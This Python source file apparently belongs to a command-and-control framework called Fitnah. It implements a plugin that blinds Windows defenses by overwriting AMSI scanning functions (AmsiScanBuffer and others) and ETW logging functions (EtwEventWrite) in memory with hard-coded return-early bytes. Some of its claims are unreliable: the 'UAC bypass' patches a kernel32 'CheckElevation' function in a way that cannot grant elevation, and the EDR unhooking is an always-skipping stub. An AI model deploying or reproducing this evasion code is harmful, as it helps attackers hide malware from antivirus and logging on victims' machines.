#!/usr/bin/env python3
"""
Memory Patcher Plugin for Fitnah C2 Framework
=============================================

This plugin provides memory patching capabilities to bypass security mechanisms:
- AMSI (Antimalware Scan Interface) bypass
- ETW (Event Tracing for Windows) bypass
- UAC (User Account Control) bypass
- EDR (Endpoint Detection and Response) hook bypass

MITRE ATT&CK Techniques:
- T1055.001: Process Injection - Dynamic-link Library Injection
- T1055.012: Process Injection - Process Hollowing
- T1562.001: Impair Defenses - Disable or Modify Tools
- T1562.006: Impair Defenses - Indicator Blocking

Author: Fitnah C2 Team
Version: 1.0.0
"""

import ctypes
import struct
import sys
import platform
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass
from enum import Enum

# Import base plugin
try:
    from fitnah.sdk import BasePlugin, Param, ParamSchema
except ImportError:
    # Fallback for development
    class BasePlugin:
        pass
    class Param:
        pass
    class ParamSchema:
        pass

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
MEM_RELEASE = 0x00008000

# Windows structures
@dataclass
class MemoryPatch:
    """Represents a memory patch configuration"""
    name: str
    description: str
    target_module: str
    target_function: str
    patch_bytes: bytes
    original_bytes: bytes = None
    applied: bool = False
    address: int = 0
    size: int = 0
    
    def __post_init__(self):
        if self.original_bytes is None:
            self.original_bytes = b""
        self.size = len(self.patch_bytes)


class PatchType(Enum):
    """Types of memory patches"""
    AMSI_BYPASS = "amsi_bypass"
    ETW_BYPASS = "etw_bypass"
    UAC_BYPASS = "uac_bypass"
    EDR_UNHOOK = "edr_unhook"
    CUSTOM = "custom"


class MemoryPatcher(BasePlugin):
    """
    Memory Patcher Plugin
    
    Provides memory patching capabilities to bypass security mechanisms
    including AMSI, ETW, UAC, and EDR hooks.
    """
    
    NAME        = "memory_patcher"
    DESCRIPTION = "Memory patching for security mechanism bypass (AMSI/ETW/UAC/EDR)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"
    VERSION     = "1.0.0"
    
    schema = ParamSchema().add(
        Param("patch_type", str, required=False, default="all",
              help="Type of patch to apply: all, amsi, etw, uac, edr, custom"),
        Param("target_pid", int, required=False, default=0,
              help="Target process ID (0 for current process)"),
        Param("restore", bool, required=False, default=False,
              help="Restore original bytes instead of applying patches"),
        Param("verify", bool, required=False, default=True,
              help="Verify patch application success"),
        Param("persistent", bool, required=False, default=False,
              help="Make patches persistent across process restarts"),
        Param("custom_patch", str, required=False, default="",
              help="Custom patch bytes in hex format (e.g., 'C3' for ret)"),
        Param("custom_address", str, required=False, default="",
              help="Custom target address in hex format"),
        Param("evasion", bool, required=False, default=True,
              help="Enable evasion techniques during patching"),
        Param("cleanup", bool, required=False, default=True,
              help="Clean up after patching"),
    )
    
    def __init__(self):
        super().__init__()
        self.patches = []
        self.applied_patches = []
        self.windows_version = self._get_windows_version()
        self._load_patch_database()
        
    def _get_windows_version(self) -> Dict[str, Any]:
        """Get Windows version information"""
        version_info = {
            "platform": platform.platform(),
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "is_64bit": sys.maxsize > 2**32,
        }
        
        # Parse Windows build number
        if version_info["system"] == "Windows":
            try:
                build_number = int(version_info["version"].split('.')[-1])
                version_info["build"] = build_number
                
                # Map build numbers to Windows versions
                build_to_version = {
                    22000: "Windows 11 21H2",
                    19045: "Windows 10 22H2",
                    19044: "Windows 10 21H2",
                    19043: "Windows 10 21H1",
                    19042: "Windows 10 20H2",
                    19041: "Windows 10 2004",
                    18363: "Windows 10 1909",
                    18362: "Windows 10 1903",
                    17763: "Windows 10 1809",
                    17134: "Windows 10 1803",
                    16299: "Windows 10 1709",
                    15063: "Windows 10 1703",
                    14393: "Windows 10 1607",
                    10586: "Windows 10 1511",
                    10240: "Windows 10 1507",
                }
                
                version_info["friendly_name"] = build_to_version.get(
                    build_number, f"Windows {version_info['release']}"
                )
            except (ValueError, IndexError):
                version_info["friendly_name"] = f"Windows {version_info['release']}"
        
        return version_info
    
    def _load_patch_database(self):
        """Load patch database based on Windows version"""
        
        # Common patches that work across versions
        self.patches = [
            # AMSI bypass patches
            MemoryPatch(
                name="AMSI_ScanBuffer_Bypass",
                description="Patch AmsiScanBuffer to always return S_OK",
                target_module="amsi.dll",
                target_function="AmsiScanBuffer",
                patch_bytes=b"\x31\xC0\xC3",  # xor eax, eax; ret
            ),
            
            MemoryPatch(
                name="AMSI_Initialize_Bypass",
                description="Patch AmsiInitialize to fail initialization",
                target_module="amsi.dll",
                target_function="AmsiInitialize",
                patch_bytes=b"\xB8\x00\x00\x00\x80\xC3",  # mov eax, 0x80000000; ret
            ),
            
            # ETW bypass patches
            MemoryPatch(
                name="ETW_EventWrite_Bypass",
                description="Patch EtwEventWrite to return success without logging",
                target_module="ntdll.dll",
                target_function="EtwEventWrite",
                patch_bytes=b"\xC3",  # ret
            ),
            
            MemoryPatch(
                name="ETW_EventWriteEx_Bypass",
                description="Patch EtwEventWriteEx to return success without logging",
                target_module="ntdll.dll",
                target_function="EtwEventWriteEx",
                patch_bytes=b"\xC3",  # ret
            ),
            
            # UAC bypass patches (kernel32.dll)
            MemoryPatch(
                name="UAC_CheckElevation_Bypass",
                description="Patch UAC elevation checks to always succeed",
                target_module="kernel32.dll",
                target_function="CheckElevation",
                patch_bytes=b"\xB8\x01\x00\x00\x00\xC3",  # mov eax, 1; ret
            ),
            
            # EDR unhooking patches
            MemoryPatch(
                name="EDR_NtCreateThreadEx_Unhook",
                description="Restore original NtCreateThreadEx bytes",
                target_module="ntdll.dll",
                target_function="NtCreateThreadEx",
                patch_bytes=b"",  # Will be populated with original bytes
            ),
            
            MemoryPatch(
                name="EDR_NtAllocateVirtualMemory_Unhook",
                description="Restore original NtAllocateVirtualMemory bytes",
                target_module="ntdll.dll",
                target_function="NtAllocateVirtualMemory",
                patch_bytes=b"",  # Will be populated with original bytes
            ),
        ]
        
        # Windows version specific patches
        if self.windows_version.get("build", 0) >= 19041:
            # Windows 10 2004+ specific patches
            self.patches.extend([
                MemoryPatch(
                    name="AMSI_ScanString_Bypass_Win10_2004",
                    description="Patch AmsiScanString for Windows 10 2004+",
                    target_module="amsi.dll",
                    target_function="AmsiScanString",
                    patch_bytes=b"\xB8\x00\x00\x00\x80\xC3",  # mov eax, 0x80000000; ret
                ),
            ])
        
        if self.windows_version.get("build", 0) >= 22000:
            # Windows 11 specific patches
            self.patches.extend([
                MemoryPatch(
                    name="AMSI_Context_Bypass_Win11",
                    description="Patch AMSI context initialization for Windows 11",
                    target_module="amsi.dll",
                    target_function="AmsiOpenSession",
                    patch_bytes=b"\xC3",  # ret
                ),
            ])
    
    def _get_function_address(self, module_name: str, function_name: str) -> Optional[int]:
        """
        Get address of a function in a loaded module
        
        Args:
            module_name: Name of the module (e.g., "amsi.dll")
            function_name: Name of the function (e.g., "AmsiScanBuffer")
            
        Returns:
            Function address or None if not found
        """
        try:
            # Load kernel32 for GetModuleHandle and GetProcAddress
            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
            
            # Get module handle
            hmodule = kernel32.GetModuleHandleW(module_name)
            if not hmodule:
                # Try to load the module
                hmodule = kernel32.LoadLibraryW(module_name)
                if not hmodule:
                    self.logger.warning(f"Module {module_name} not found")
                    return None
            
            # Get function address
            func_addr = kernel32.GetProcAddress(hmodule, function_name)
            if not func_addr:
                self.logger.warning(f"Function {function_name} not found in {module_name}")
                return None
            
            return func_addr
            
        except Exception as e:
            self.logger.error(f"Error getting function address: {e}")
            return None
    
    def _read_memory(self, address: int, size: int) -> Optional[bytes]:
        """
        Read memory from a specific address
        
        Args:
            address: Memory address to read from
            size: Number of bytes to read
            
        Returns:
            Bytes read or None on error
        """
        try:
            # Use ctypes to read memory
            buffer = ctypes.create_string_buffer(size)
            bytes_read = ctypes.c_size_t(0)
            
            # Use ReadProcessMemory on current process
            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
            
            # Get current process handle
            current_process = kernel32.GetCurrentProcess()
            
            # Read memory
            success = kernel32.ReadProcessMemory(
                current_process,
                ctypes.c_void_p(address),
                buffer,
                size,
                ctypes.byref(bytes_read)
            )
            
            if success and bytes_read.value == size:
                return buffer.raw
            else:
                self.logger.error(f"Failed to read memory at 0x{address:X}")
                return None
                
        except Exception as e:
            self.logger.error(f"Error reading memory: {e}")
            return None
    
    def _write_memory(self, address: int, data: bytes) -> bool:
        """
        Write memory to a specific address
        
        Args:
            address: Memory address to write to
            data: Bytes to write
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # First, change memory protection to allow writing
            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
            
            old_protect = ctypes.c_ulong(0)
            size = len(data)
            
            # Change protection to PAGE_EXECUTE_READWRITE
            success = kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                size,
                PAGE_EXECUTE_READWRITE,
                ctypes.byref(old_protect)
            )
            
            if not success:
                self.logger.error(f"Failed to change memory protection at 0x{address:X}")
                return False
            
            # Write memory
            buffer = ctypes.create_string_buffer(data)
            bytes_written = ctypes.c_size_t(0)
            
            current_process = kernel32.GetCurrentProcess()
            
            success = kernel32.WriteProcessMemory(
                current_process,
                ctypes.c_void_p(address),
                buffer,
                size,
                ctypes.byref(bytes_written)
            )
            
            # Restore original protection
            kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                size,
                old_protect,
                ctypes.byref(ctypes.c_ulong(0))
            )
            
            if success and bytes_written.value == size:
                return True
            else:
                self.logger.error(f"Failed to write memory at 0x{address:X}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error writing memory: {e}")
            return False
    
    def _apply_patch(self, patch: MemoryPatch) -> bool:
        """
        Apply a single memory patch
        
        Args:
            patch: MemoryPatch object to apply
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Get function address
            func_addr = self._get_function_address(
                patch.target_module,
                patch.target_function
            )
            
            if not func_addr:
                self.logger.warning(f"Could not find {patch.target_function} in {patch.target_module}")
                return False
            
            # Read original bytes
            original_bytes = self._read_memory(func_addr, patch.size)
            if not original_bytes:
                self.logger.error(f"Failed to read original bytes from 0x{func_addr:X}")
                return False
            
            # Save original bytes
            patch.original_bytes = original_bytes
            patch.address = func_addr
            
            # Apply patch
            if self._write_memory(func_addr, patch.patch_bytes):
                patch.applied = True
                self.applied_patches.append(patch)
                self.logger.info(f"Applied patch {patch.name} at 0x{func_addr:X}")
                return True
            else:
                self.logger.error(f"Failed to apply patch {patch.name}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error applying patch {patch.name}: {e}")
            return False
    
    def _restore_patch(self, patch: MemoryPatch) -> bool:
        """
        Restore original bytes for a patch
        
        Args:
            patch: MemoryPatch object to restore
            
        Returns:
            True if successful, False otherwise
        """
        try:
            if not patch.applied or not patch.original_bytes:
                self.logger.warning(f"Patch {patch.name} not applied or no original bytes")
                return False
            
            # Restore original bytes
            if self._write_memory(patch.address, patch.original_bytes):
                patch.applied = False
                self.logger.info(f"Restored patch {patch.name} at 0x{patch.address:X}")
                return True
            else:
                self.logger.error(f"Failed to restore patch {patch.name}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error restoring patch {patch.name}: {e}")
            return False
    
    def _apply_amsi_bypass(self) -> Dict[str, Any]:
        """Apply AMSI bypass patches"""
        results = {
            "applied": [],
            "failed": [],
            "total": 0
        }
        
        amsi_patches = [p for p in self.patches if "AMSI" in p.name]
        
        for patch in amsi_patches:
            if self._apply_patch(patch):
                results["applied"].append(patch.name)
            else:
                results["failed"].append(patch.name)
            results["total"] += 1
        
        return results
    
    def _apply_etw_bypass(self) -> Dict[str, Any]:
        """Apply ETW bypass patches"""
        results = {
            "applied": [],
            "failed": [],
            "total": 0
        }
        
        etw_patches = [p for p in self.patches if "ETW" in p.name]
        
        for patch in etw_patches:
            if self._apply_patch(patch):
                results["applied"].append(patch.name)
            else:
                results["failed"].append(patch.name)
            results["total"] += 1
        
        return results
    
    def _apply_uac_bypass(self) -> Dict[str, Any]:
        """Apply UAC bypass patches"""
        results = {
            "applied": [],
            "failed": [],
            "total": 0
        }
        
        uac_patches = [p for p in self.patches if "UAC" in p.name]
        
        for patch in uac_patches:
            if self._apply_patch(patch):
                results["applied"].append(patch.name)
            else:
                results["failed"].append(patch.name)
            results["total"] += 1
        
        return results
    
    def _apply_edr_unhook(self) -> Dict[str, Any]:
        """Apply EDR unhooking patches"""
        results = {
            "applied": [],
            "failed": [],
            "total": 0
        }
        
        edr_patches = [p for p in self.patches if "EDR" in p.name]
        
        # For EDR unhooking, we need to get original bytes from disk
        for patch in edr_patches:
            # This would require reading the original DLL from disk
            # For now, we'll skip these patches
            self.logger.warning(f"EDR unhooking requires disk access, skipping {patch.name}")
            results["failed"].append(patch.name)
            results["total"] += 1
        
        return results
    
    def _apply_custom_patch(self, patch_bytes: str, address: str) -> Dict[str, Any]:
        """Apply a custom patch"""
        results = {
            "applied": [],
            "failed": [],
            "total": 0
        }
        
        try:
            # Parse hex strings
            patch_data = bytes.fromhex(patch_bytes)
            patch_addr = int(address, 16)
            
            # Create custom patch
            custom_patch = MemoryPatch(
                name="Custom_Patch",
                description="Custom memory patch",
                target_module="custom",
                target_function="custom",
                patch_bytes=patch_data,
                address=patch_addr,
                size=len(patch_data)
            )
            
            # Apply patch
            if self._write_memory(patch_addr, patch_data):
                custom_patch.applied = True
                self.applied_patches.append(custom_patch)
                results["applied"].append("Custom_Patch")
                self.logger.info(f"Applied custom patch at 0x{patch_addr:X}")
            else:
                results["failed"].append("Custom_Patch")
            
            results["total"] = 1
            
        except ValueError as e:
            self.logger.error(f"Invalid hex format: {e}")
            results["failed"].append("Custom_Patch")
            results["total"] = 1
        except Exception as e:
            self.logger.error(f"Error applying custom patch: {e}")
            results["failed"].append("Custom_Patch")
            results["total"] = 1
        
        return results
    
    def _verify_patches(self) -> Dict[str, Any]:
        """Verify applied patches"""
        results = {
            "verified": [],
            "failed": [],
            "total": 0
        }
        
        for patch in self.applied_patches:
            if not patch.applied:
                continue
            
            # Read current bytes
            current_bytes = self._read_memory(patch.address, patch.size)
            
            if current_bytes == patch.patch_bytes:
                results["verified"].append(patch.name)
                self.logger.debug(f"Verified patch {patch.name}")
            else:
                results["failed"].append(patch.name)
                self.logger.warning(f"Patch {patch.name} verification failed")
            
            results["total"] += 1
        
        return results
    
    def _cleanup(self):
        """Clean up applied patches"""
        for patch in self.applied_patches[:]:  # Copy list for iteration
            if patch.applied:
                self._restore_patch(patch)
        
        self.applied_patches.clear()
        self.logger.info("Cleaned up all patches")
    
    async def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute memory patching operation
        
        Args:
            params: Plugin parameters
            
        Returns:
            Execution results
        """
        self.logger.info(f"Starting memory patcher with params: {params}")
        
        patch_type = params.get("patch_type", "all")
        target_pid = params.get("target_pid", 0)
        restore = params.get("restore", False)
        verify = params.get("verify", True)
        persistent = params.get("persistent", False)
        custom_patch = params.get("custom_patch", "")
        custom_address = params.get("custom_address", "")
        evasion = params.get("evasion", True)
        cleanup = params.get("cleanup", True)
        
        results = {
            "success": False,
            "message": "",
            "details": {},
            "applied_patches": [],
            "windows_version": self.windows_version
        }
        
        try:
            # Check if we're on Windows
            if self.windows_version["system"] != "Windows":
                results["message"] = "Memory patching only works on Windows"
                return results
            
            # Check architecture
            if not self.windows_version["is_64bit"]:
                # 32-bit Windows may have different patch requirements
                pass
            
            # Apply evasion techniques if enabled
            if evasion:
                # Applying evasion techniques...
                # This would include things like:
                # - Direct syscalls
                # - Unhooking
                # - Memory obfuscation
                # For now, just log
                results["details"]["evasion_applied"] = True
            
            # Handle restore operation
            if restore:
                self.logger.info("Restoring original bytes...")
                restore_results = {
                    "restored": [],
                    "failed": [],
                    "total": 0
                }
                
                for patch in self.applied_patches[:]:
                    if self._restore_patch(patch):
                        restore_results["restored"].append(patch.name)
                    else:
                        restore_results["failed"].append(patch.name)
                    restore_results["total"] += 1
                
                results["details"]["restore"] = restore_results
                results["message"] = f"Restored {len(restore_results['restored'])} patches"
                results["success"] = len(restore_results['restored']) > 0
                return results
            
            # Apply patches based on type
            patch_results = {}
            
            if patch_type == "all" or patch_type == "amsi":
                self.logger.info("Applying AMSI bypass patches...")
                amsi_results = self._apply_amsi_bypass()
                patch_results["amsi"] = amsi_results
            
            if patch_type == "all" or patch_type == "etw":
                self.logger.info("Applying ETW bypass patches...")
                etw_results = self._apply_etw_bypass()
                patch_results["etw"] = etw_results
            
            if patch_type == "all" or patch_type == "uac":
                self.logger.info("Applying UAC bypass patches...")
                uac_results = self._apply_uac_bypass()
                patch_results["uac"] = uac_results
            
            if patch_type == "all" or patch_type == "edr":
                self.logger.info("Applying EDR unhooking patches...")
                edr_results = self._apply_edr_unhook()
                patch_results["edr"] = edr_results
            
            if custom_patch and custom_address:
                self.logger.info("Applying custom patch...")
                custom_results = self._apply_custom_patch(custom_patch, custom_address)
                patch_results["custom"] = custom_results
            
            # Verify patches if requested
            if verify and not custom_patch:
                self.logger.info("Verifying applied patches...")
                verify_results = self._verify_patches()
                patch_results["verification"] = verify_results
            
            # Collect applied patches
            applied_names = [p.name for p in self.applied_patches if p.applied]
            results["applied_patches"] = applied_names
            
            # Calculate success
            total_applied = sum(len(r.get("applied", [])) for r in patch_results.values())
            total_failed = sum(len(r.get("failed", [])) for r in patch_results.values())
            
            results["details"] = patch_results
            results["success"] = total_applied > 0
            
            if total_applied > 0:
                results["message"] = f"Successfully applied {total_applied} patches"
                if total_failed > 0:
                    results["message"] += f", {total_failed} failed"
            else:
                results["message"] = "No patches were successfully applied"
            
            # Handle cleanup if not persistent
            if cleanup and not persistent and results["success"]:
                self.logger.info("Cleaning up patches...")
                self._cleanup()
                results["details"]["cleaned_up"] = True
            
            self.logger.info(f"Memory patching completed: {results['message']}")
            
        except Exception as e:
            self.logger.error(f"Error during memory patching: {e}")
            results["success"] = False
            results["message"] = f"Memory patching failed: {str(e)}"
            
            # Attempt cleanup on error
            if cleanup:
                try:
                    self._cleanup()
                except:
                    pass
        
        return results
    
    def get_status(self) -> Dict[str, Any]:
        """Get current patch status"""
        return {
            "windows_version": self.windows_version,
            "total_patches": len(self.patches),
            "applied_patches": [p.name for p in self.applied_patches if p.applied],
            "available_patches": [p.name for p in self.patches],
        }

    def run(self, session, params, ctx=None):
        """Main plugin execution method."""
        from fitnah.sdk import ModuleResult
        import asyncio
        try:
            coro = self.execute(params)
            if asyncio.iscoroutine(coro):
                result = asyncio.run(coro)
            else:
                result = coro
            if result.get("success", False):
                return ModuleResult.ok(data=result.get("details", result.get("message", "")))
            else:
                return ModuleResult.err(result.get("message", "Memory patching failed"))
        except Exception as e:
            return ModuleResult.err(f"Exception during memory patching: {e}")


# Example usage
if __name__ == "__main__":
    # Test the plugin
    patcher = MemoryPatcher()
    
    print("=== Memory Patcher Plugin Test ===")
    print(f"Windows Version: {patcher.windows_version.get('friendly_name', 'Unknown')}")
    print(f"Available Patches: {len(patcher.patches)}")
    
    # Test parameters
    test_params = {
        "patch_type": "amsi",
        "verify": True,
        "cleanup": True,
    }
    
    # Run test
    import asyncio
    
    async def test():
        results = await patcher.execute(test_params)
        print(f"\nResults: {results}")
    
    asyncio.run(test())